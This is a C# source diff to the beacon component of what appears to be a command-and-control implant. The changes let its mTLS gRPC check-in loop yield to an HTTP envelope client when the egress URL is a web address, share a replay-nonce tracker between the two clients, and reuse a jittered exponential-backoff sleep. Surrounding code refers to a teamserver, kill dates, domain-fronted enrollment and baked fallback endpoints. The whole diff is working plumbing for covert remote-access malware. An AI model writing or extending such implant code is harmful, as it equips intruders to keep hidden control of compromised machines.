@@ -19,6 +19,20 @@ namespace Rod.Implant.Internal;
 // Sec 10.3). The stream is bidirectional frames whose payloads are the rod.v1
 // handshake/task/result messages.
 
+// How a check-in client's run ended for the program's coordinator (see
+// Beacon.RunAsync and EnvelopeBeacon.RunAsync): terminated for good, or
+// yielded because the egress walk's current beacon URL belongs to the other
+// client -- a web URL (http(s)://) runs the envelope POST cycle, a bare
+// host:port runs this mTLS gRPC stream.
+internal enum CheckInExit
+{
+    // The kill date passed or the server refused the handshake permanently.
+    Terminate,
+
+    // The walk's current entry is the other client's URL shape; hand over.
+    SwitchTransport,
+}
+
 /// <summary>
 /// Runs the implant's check-in lifecycle against the teamserver: dial the mTLS
 /// endpoint, complete the handshake, then loop dispatching downstream tasks and
@@ -54,8 +68,9 @@ internal sealed class Beacon
 
     // The replay-nonce state (architecture.md Sec 9 -- tasking replay nonces):
     // the accepted-nonce floor spans the implant's whole run, so a captured
-    // frame replayed after a reconnect still falls at or below it.
-    private readonly TaskNonceTracker _nonces = new();
+    // frame replayed after a reconnect still falls at or below it. Shared
+    // with the envelope client when both cover one run.
+    private readonly TaskNonceTracker _nonces;
 
     /// <summary>
     /// Builds a Beacon whose handler registry carries no enroll bundle, so the
@@ -75,8 +90,9 @@ internal sealed class Beacon
     /// </summary>
     public Beacon(string mode, EgressEndpoints egress, string implantId, X509Certificate2 leaf, RSA privateKey,
         IReadOnlyList<X509Certificate2> cas, TimeSpan sleep, TimeSpan jitter, DateTimeOffset? killDate,
-        EnrollBundle? enroll, IReadOnlyList<string> classVerbs, TextWriter log)
-        : this(egress, implantId, leaf, privateKey, cas, sleep, jitter, killDate, enroll, classVerbs, log)
+        EnrollBundle? enroll, IReadOnlyList<string> classVerbs, TextWriter log,
+        TaskNonceTracker? nonces = null)
+        : this(egress, implantId, leaf, privateKey, cas, sleep, jitter, killDate, enroll, classVerbs, log, nonces)
     {
         _mode = mode;
     }
@@ -88,10 +104,14 @@ internal sealed class Beacon
     /// the advertised capability set derives from it (Sec 5.3).
     /// <paramref name="egress"/> is the baked endpoint walk (Sec 8): the cycle
     /// dials the current entry and a failed cycle advances to the next.
+    /// <paramref name="nonces"/> shares the replay-nonce floor with another
+    /// check-in client covering the same run (the envelope client); null keeps
+    /// this beacon's own tracker.
     /// </summary>
     public Beacon(EgressEndpoints egress, string implantId, X509Certificate2 leaf, RSA privateKey,
         IReadOnlyList<X509Certificate2> cas, TimeSpan sleep, TimeSpan jitter, DateTimeOffset? killDate,
-        EnrollBundle? enroll, IReadOnlyList<string> classVerbs, TextWriter log)
+        EnrollBundle? enroll, IReadOnlyList<string> classVerbs, TextWriter log,
+        TaskNonceTracker? nonces = null)
     {
         _mode = BeaconModes.Stream;
         _egress = egress;
@@ -115,6 +135,7 @@ internal sealed class Beacon
         _fronted = enroll?.Fronted;
         _classVerbs = classVerbs;
         _log = log;
+        _nonces = nonces ?? new TaskNonceTracker();
     }
 
     /// <summary>
@@ -124,9 +145,11 @@ internal sealed class Beacon
     /// backing off exponentially over consecutive failures so a down teamserver
     /// is not hammered at beacon rate. The kill date is checked at the top of
     /// each cycle so a long-running implant self-terminates once it passes, not
-    /// only on the next restart (architecture.md Sec 7).
+    /// only on the next restart (architecture.md Sec 7). Returns
+    /// <see cref="CheckInExit.SwitchTransport"/> when the walk's current entry
+    /// is a web URL, so the coordinator hands the run to the envelope client.
     /// </summary>
-    public async Task RunAsync(CancellationToken cancellationToken)
+    public async Task<CheckInExit> RunAsync(CancellationToken cancellationToken)
     {
         var consecutiveFailures = 0;
         while (!cancellationToken.IsCancellationRequested)
@@ -134,8 +157,14 @@ internal sealed class Beacon
             if (_killDate is { } killDate && DateTimeOffset.Now > killDate)
             {
                 _log.WriteLine($"beacon kill date {killDate:O} reached; terminating");
-                return;
+                return CheckInExit.Terminate;
             }
+            // The transport selection follows the egress walk's URL shape: a
+            // web entry (http(s)://) is the envelope POST client's -- yield so
+            // the coordinator hands the run over. Re-checked every cycle, so a
+            // walk that crosses shapes re-routes at the next entry.
+            if (EnvelopeBeacon.IsWebBeaconUrl(_egress.CurrentBeaconUrl))
+                return CheckInExit.SwitchTransport;
             var cycle = BeaconCycleResult.Dropped;
             try
             {
@@ -158,7 +187,7 @@ internal sealed class Beacon
             // date expired, unknown implant -- none of them change on a retry),
             // so the loop ends there instead of reconnecting forever.
             if (cycle == BeaconCycleResult.Terminal)
-                return;
+                return CheckInExit.Terminate;
 
             if (cycle == BeaconCycleResult.Handshaken)
             {
@@ -179,13 +208,14 @@ internal sealed class Beacon
             }
             try
             {
-                await SleepWithJitterAsync(consecutiveFailures, cancellationToken);
+                await SleepWithJitterAsync(_sleep, _jitter, consecutiveFailures, cancellationToken);
             }
             catch (OperationCanceledException)
             {
-                return;
+                return CheckInExit.Terminate;
             }
         }
+        return CheckInExit.Terminate;
     }
 
     // What one connect-handshake-task cycle produced, driving the reconnect
@@ -738,15 +768,20 @@ internal sealed class Beacon
     private const int MaxBackoffExponent = 4;
 
     // Sleeps for the base interval (doubled per consecutive failure, capped)
-    // +/- jitter/2, honoring cancellation.
-    private async Task SleepWithJitterAsync(int consecutiveFailures, CancellationToken cancellationToken)
+    // +/- jitter/2, honoring cancellation. Shared by both check-in clients --
+    // the envelope cycle backs off exactly like the stream.
+    internal static async Task SleepWithJitterAsync(
+        TimeSpan sleep,
+        TimeSpan jitter,
+        int consecutiveFailures,
+        CancellationToken cancellationToken)
     {
-        var d = _sleep;
+        var d = sleep;
         for (var i = 0; i < Math.Min(consecutiveFailures, MaxBackoffExponent); i++)
             d += d;
-        if (_jitter > TimeSpan.Zero)
+        if (jitter > TimeSpan.Zero)
         {
-            var deltaTicks = (long)(Random.Shared.NextDouble() * _jitter.Ticks) - _jitter.Ticks / 2;
+            var deltaTicks = (long)(Random.Shared.NextDouble() * jitter.Ticks) - jitter.Ticks / 2;
             d = d + TimeSpan.FromTicks(deltaTicks);
         }
         if (d < TimeSpan.Zero)
